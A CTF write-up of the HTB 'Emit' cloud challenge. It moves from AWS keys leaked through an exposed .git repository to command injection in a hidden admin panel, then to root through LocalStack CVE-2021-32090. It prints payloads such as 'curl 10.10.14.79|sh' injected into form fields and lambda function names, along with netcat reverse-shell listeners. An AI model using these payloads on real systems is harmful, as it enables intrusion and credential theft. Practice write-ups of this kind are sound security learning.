# Emit (Cloud Challenge)
HTB Business CTF 2023
Writeup by: @godylockz

## Challenge Description
Category: Cloud
Difficulty: Medium
Points: 1000
N/A

## Strategy
The premise revolving around this challenge was to recover AWS secrets from git repository accessible on the website, use those credentials to assume another AWS role.
These credentials then have strict permissions for the following two services:
- AWS CloudFormation is a service that allows you to define and provision AWS infrastructure as code. It enables you to create, update, and delete AWS resources in a predictable and automated way using templates written in either YAML or JSON format. These templates describe the resources and their configurations, including EC2 instances, load balancers, security groups, IAM roles, S3 buckets, and more. 
- AWS Systems Manager (SSM) is a suite of tools that provides centralized visibility and control over your AWS resources. It includes various features like Run Command, Patch Manager, Parameter Store, Session Manager, and more.

Leverage the information from enumerating these services, you can then access a hidden administrator page. The hidden administrator page is vulnerable to command injection with additional AWS permissions to create/invoke lambda functions. The endpoint is running Localstack v0.12.6and is thus vulnerable to CVE-2021-32090 to effectively get root and access the flag.

Connect to the HTB VPN via `sudo openvpn <vpntoken>.ovpn`
Add `emit.htb` to your `/etc/hosts` file for local DNS resolution.

Running nmap to the target:
```text
Nmap scan report for emit.htb (10.129.229.92)
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-git: 
|   10.129.229.92:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating agents 
|_http-title: Satellite Management System
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Browsing to the website at `http://emit.htb` :
![emit_1](images/emit_1.png)

Directory fuzzing with feroxbuster we can quickly identify a `.git` directory:
```sh
$ feroxbuster -u http://emit.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
200      GET        1l        2w       23c http://emit.htb/.git/HEAD
200      GET        4l        6w      212c http://emit.htb/.git/index
200      GET        5l       13w       92c http://emit.htb/.git/config
301      GET        9l       28w      303c http://emit.htb/.git => http://emit.htb/.git/
200      GET        7l       23w    20434c http://emit.htb/images/ico.ico
200      GET      494l     1137w    11173c http://emit.htb/
```

Dump the `.git` endpoint using git_dumper:
```sh
git_dumper.py http://emit.htb/.git git-dump
```

All commits are done by the `maximus_supervisor` and there are 5 commits:
```sh
$ git log   
commit a9257fef04b544d4b78b5000d348eb3840dec021 (HEAD -> master)
Author: maximus_supervisor <maximus_supervisor@emit.htb>
Date:   Tue Jul 4 05:25:02 2023 +0000

    Updating agents

commit fd2ffd54e0360d7c87e63310f2a958a7d78a0ab8
Author: maximus_supervisor <maximus_supervisor@emit.htb>
Date:   Tue Jul 4 05:23:30 2023 +0000

    Redeploying agents

commit 9cb739e6e09e04bba0aa08b486f58923fb5db514
Author: maximus_supervisor <maximus_supervisor@emit.htb>
Date:   Tue Jul 4 05:22:49 2023 +0000

    Redeploying stack

commit 2ae71d32b890edc67a820c3d9ffff418cb372561
Author: maximus_supervisor <maximus_supervisor@emit.htb>
Date:   Tue Jul 4 05:21:45 2023 +0000

    Initialization of agents

commit 8de0f0454018ef58c55796c83acd19bd873f44d0
Author: maximus_supervisor <maximus_supervisor@emit.htb>
Date:   Tue Jul 4 05:19:49 2023 +0000

    Payload stack deployment
```

Identify AWS secrets within git version control:
```text
$ git log -p
..[snip]..
endpoint_url = '[http://cloud.emit.htb'](http://cloud.emit.htb') #Localstack v0.12.6
access_key_id = "AKIA6CFMOGSLALOPETMB"
secret_access_key = "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"
region = "us-east-2"
..[snip]..
RoleName: maximus-agent
```

AWS Endpoint Function Workaround (Added https://github.com/aws/aws-cli/pull/8006/commits/e34caf506696db97c24d40da5a45e3e5b3bc5cb2)
Make sure you are running the latest version of `aws-cli` so you don't have to type the `--endpoint-url` every time or use the following:
```sh
$ export AWS_ENDPOINT_URL=http://emit.unveiled.htb
function aws() {
	export AWS_DEFAULT_OUTPUT=yaml 
	if [ -z "$AWS_ENDPOINT_URL" ]
	then
		command aws "$@"
	else
		command aws "$@" --endpoint-url "$AWS_ENDPOINT_URL"
	fi
}
```

Configure AWS-CLI with new AWS credentials and check if we can access the private S3 bucket of `website-assets`.
```sh
$ export AWS_ENDPOINT_URL=http://cloud.emit.htb
$ aws configure
AWS Access Key ID [****************QTMA]: AKIA6CFMOGSLALOPETMB
AWS Secret Access Key [****************7CB5]: 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
Default region name [us-east-1]: us-east-2
Default output format [None]: yaml

$ aws sts get-caller-identity
Account: '925169031785'
Arn: arn:aws:iam::925169031785:user/integration_engineer
UserId: AKIAIOSFODNN7DXV3G29
```

Obtain temporary security credentials by assuming a specified IAM (Identity and Access Management) role in AWS of `maximus-agent` that was leaked from the git repository.
```
$ aws sts assume-role --role-arn "arn:aws:iam::925169031785:user/maximus-agent" --role-session-name 'i-assumed-an-user'
AssumedRoleUser:
  Arn: arn:aws:sts::000000000000:assumed-role/maximus-agent/i-assumed-an-user
  AssumedRoleId: AROA3X42LBCDX46XPI2U5:i-assumed-an-user
Credentials:
  AccessKeyId: AKIA9DVLPWFJEPQSAGKM
  Expiration: '2023-07-17T15:18:37.369000+00:00'
  SecretAccessKey: viZy5C8XwF+RrLe0vCxLfj9efIDJl0kEOOONNku1
  SessionToken: FQoGZXIvYXdzEBYaDg0lBY2ZIjfy+a3j+TmApXXCncc37mIKsfQ0E5ysJCIN/FgGAIDFiGx0qQRUS8qPkOSGPDVbv0PEbx0ebM6pHefylh9ZA0pdsv8Br27jx8CVBj5Y4d6wYpAyXpDlEVRzPgAi5RvgEinitTOFQ9LuTNeIHhvjUEXoFSZheDcsg0OaQupK2DjmkmVWMAARfAKD8rHtiyp+ZogkwV+lr+OdtJwHO3MsSIA82owXhNTTMsxSaw1OnHXispHZt7kZhptxg0sZR4Qf/LB+eQvZ7yyBRgb/D9qqQQfB3/8elE62eqG8HxeYddV4pQ5jaU1W6C2RJvg8GYdu1VL1SqHS/GM=
PackedPolicySize: 6
```

Configure AWS-CLI with new AWS credentials and check our userid:
```sh
$ export AWS_ENDPOINT_URL=http://cloud.emit.htb
$ aws configure                                                                                                       
AWS Access Key ID [****************ETMB]: AKIA9DVLPWFJEPQSAGKM
AWS Secret Access Key [****************9wVc]: viZy5C8XwF+RrLe0vCxLfj9efIDJl0kEOOONNku1
Default region name [us-east-1]:
Default output format [yaml]:

$ aws sts get-caller-identity                                 Account: '236190431348'
Arn: arn:aws:iam::236190431348:user/maximus-agent
UserId: AKIAIPWQSFCB9GEL2P50
```

Describe CloudFormation stacks:
https://docs.aws.amazon.com/cli/latest/reference/cloudformation/describe-stacks.html
```sh
$ aws cloudformation describe-stacks
Stacks:
...[snip]...
- Capabilities: []
  CreationTime: '2023-07-17T13:52:54.607000+00:00'
  Outputs: []
  Parameters:
  - ParameterKey: Password
    ParameterValue: dHgtu10kLmDrESd
  StackId: arn:aws:cloudformation:us-east-1:000000000000:stack/mission-deployment-stage4/a6c4d741
  StackName: mission-deployment-stage4
  StackStatus: CREATE_COMPLETE
  Tags: []
...[snip]...
```
A password of `dHgtu10kLmDrESd` is listed on the mission-deployment-stage4 stack.

Describe 
```sh
$ aws ssm list-commands
Commands:
..[snip]..
- CommandId: ed13f323-2f16-45f9-a3b8-5c6480713cf6
  Comment: Move backups from prod
  CompletedCount: 0
  DocumentName: AWS-RunShellScript
  ErrorCount: 0
  ExpiresAfter: '2023-07-17T14:52:58.127009'
  InstanceIds: []
  MaxConcurrency: '50'
  MaxErrors: '0'
  NotificationConfig:
    NotificationArn: string
    NotificationEvents:
    - Success
    NotificationType: Command
  OutputS3BucketName: ''
  OutputS3KeyPrefix: ''
  OutputS3Region: ''
  Parameters:
    commands:
    - mv /var/www/html/maximus-admin-panel/backup.tar.gz .
  RequestedDateTime: '2023-07-17T13:52:58.127009'
  ServiceRole: ''
  Status: Success
  StatusDetails: Details placeholder
  TargetCount: 0
  Targets:
  - Key: instanceids
    Values:
    - i-1234567890abcdef0
```
A hidden administrator panel is identified as `/maximus-admin-panel` from the `mv /var/www/html/maximus-admin-panel/backup.tar.gz .` command.

Accessing the website at http://emit.htb/maximus-admin-panel/ we are presented with a cool looking "SMS Admin Portal" as shown below:
![emit_2](images/emit_2.png)

Logging in with the username `maximus_supervisor` from the git commit history and the password from describe-stacks mission-deployment-stage-4 of `dHgtu10kLmDrESd` we get access!

![emit_3](images/emit_3.png)

Trying the `list-functions` command we get a response of 
`{ "Functions": [] }` which is making a post request to the `/maximus-admin-panel/dashboard.php` endpoint with the data `cmd=list-functions` which would be the result of running `aws lambda list-functions`. Since we don't have permission to even do that, we know this application is running as another higher-privilege user. We can also identify it by running `aws lambda list-functions help` and it also responds back with AWS-CLI help data.

Trying to inject other commands such as appending the bash delimiter of `;` and another command of `id` we get output!
```text
POST /maximus-admin-panel/dashboard.php HTTP/1.1
Host: emit.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://emit.htb/maximus-admin-panel/dashboard.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://emit.htb
Connection: close
Cookie: PHPSESSID=4ikv1aamiteg3aurv32939dgms
Upgrade-Insecure-Requests: 1

cmd=list-functions;id
```
Response:
```text
uid=1000(maximus_supervisor) gid=1000(maximus_supervisor) groups=1000(maximus_supervisor)
```

Now we can obtain a reverse shell via a reverse-shell as a service payload (such as https://reverse-shell.sh/) and hosting it at `index.html` from a quick Python webserver.
Payload:
```text
cmd=list-functions;curl 10.10.14.79|sh
```
Webserver:
```sh
$ python3 -m http.server 80
```

Reverse shell:
```sh
$ nc -nlvp 4444
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.229.92:51184.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
maximus_supervisor@emit:/var/www/html/maximus-admin-panel$
```

We can start enumerating the system, and looking at the php file of `dashboard.php` in the admin portal, we can identify the commands being executed to the AWS endpoint serving from `localhost:4566`.
```php
<?php
session_start();
if(isset($_SESSION['login'])){
    if($_SERVER['REQUEST_METHOD']=="POST"){
        $cmd = $_POST['cmd'];
	if($cmd){
		$list = ["create-function", "update-function-code", "list-functions"];
		$matchFound = false;
		foreach ($list as $item) {
		    if (strpos($cmd, $item) !== false) {
		        $matchFound = true;
		        break;
		    }
		}
		if($matchFound){
		        $command = 'aws --endpoint http://localhost:4566 lambda ' . escapeshellarg($cmd);
			$commands = explode("'",$command);
			$commands[1] = trim($commands[1],"'");
			$command = implode($commands);
			$command = str_replace('\\',"'",$command);
		        $output = array();
			if(strpos($command, "fileb") !== false){
				$pattern = '/fileb:\/\/([^ ]+)/i';
				$matches = [];
				preg_match_all($pattern, $command, $matches);
				if(file_exists("/var/www/html/maximus-admin-panel/uploads/" . $matches[1][0])){
					$command = str_replace("fileb://","fileb:///var/www/html/maximus-admin-panel/uploads/",$command);
					exec($command." 2>&1", $output);
				}
				else{
					$msg = $matches[1][0]." doesn't exist";
				}
			}
			else{
				exec($command." 2>&1", $output);
			}
		}
		else{
			$err = "Feature is disabled till satellite launch";
		}
	}
	else{
		$target_dir = "uploads/";
		$target_file = $target_dir . basename($_FILES["file"]["name"]);
		$FileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
		if($FileType != "zip"){
			$msg = "Sorry only zip files are accepted";
		}
		else{
			if(move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)){
				$msg = "Payload function code uploaded";
			}
		}
	}
    }
?>
```

Check out maximus_supervisor 's AWS called ID:
```sh
maximus_supervisor@emit:/var/www/html/maximus-admin-panel$ aws --endpoint http://localhost:4566 sts get-caller-identity
{
    "UserId": "AKIAIOSFODNN7EXAMPLE",
    "Account": "000000000000",
    "Arn": "arn:aws:sts::000000000000:user/moto"
}
````

From the git repository, it leaked the LogStack version of v0.12.6 which is vulnerable to CVE-2021-32090. Using the following as references to POCs, we can see if we can exploit it!
[https://0xdf.gitlab.io/2022/03/19/htb-stacked.html](https://0xdf.gitlab.io/2022/03/19/htb-stacked.html)
[https://www.cvedetails.com/cve/CVE-2021-32090/](https://www.cvedetails.com/cve/CVE-2021-32090/)
[https://www.sonarsource.com/blog/hack-the-stack-with-localstack/](https://www.sonarsource.com/blog/hack-the-stack-with-localstack/)

Since we can access the lambda service via the admin portal, lets see if we can create our own functions and invoke it.
```sh
cd /tmp
bash -c 'cat << "EOF" > example.js
exports.handler =  async function(event, context) {
  console.log("EVENT: \n" + JSON.stringify(event, null, 2))
  return context.logStreamName
}
EOF'
zip example.zip example.js
aws lambda create-function --function-name example --zip-file fileb://example.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint http://localhost:4566  --handler example.handler --runtime nodejs12.x
aws lambda invoke --function-name example --endpoint-url http://localhost:4566 out.json
```

We can also identify the commands run on the machine as root via uploading pspy64 at https://github.com/DominicBreuker/pspy .
```text
2023/07/17 16:48:51 CMD: UID=0     PID=49784  | /opt/code/localstack/.venv/bin/python /opt/code/localstack/.venv/bin/aws --endpoint-url=http://localhost:4566 lambda list-event-source-mappings --function-name example 
```

Now lets do another command injection payload, either make bash SUID, reverse shell back, etc. Many options. Here is what I did:
```sh
$ aws lambda create-function --function-name 'rce$(curl 10.10.14.79|sh)' --zip-file fileb://example.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://localhost:4566  --handler '$(curl 10.10.14.79|sh)' --runtime nodejs12.x
{
    "FunctionName": "rce$(curl 10.10.14.79|sh)",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:rce$(curl 10.10.14.79|sh)",
    "Runtime": "nodejs12.x",
    "Role": "arn:aws:iam::123456789012:role/lambda-role",
    "Handler": "$(curl 10.10.14.79|sh)",
    "CodeSize": 295,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2023-07-17T16:47:08.430+0000",
    "CodeSha256": "Kgo1bpwoy8e0gJDdNF50pEELqD00ItnsKYonXf45tM8=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "804e01a6-f18c-402c-a8ce-973f7dc35eec",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
$ aws lambda invoke --function-name 'rce' --endpoint-url http://localhost:4566 out.json
```

Reverse shell as root returned and we can read the root flag!
```sh
$ nc -nlvp 4444
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.229.92:41486.
bash: cannot set terminal process group (-1): Not a tty
bash: no job control in this shell
bash-5.0# cat /root/flag.txt
HTB{cl0ud_ch41ns_3m1t_p0w3r}
```

Flag: `HTB{cl0ud_ch41ns_3m1t_p0w3r}`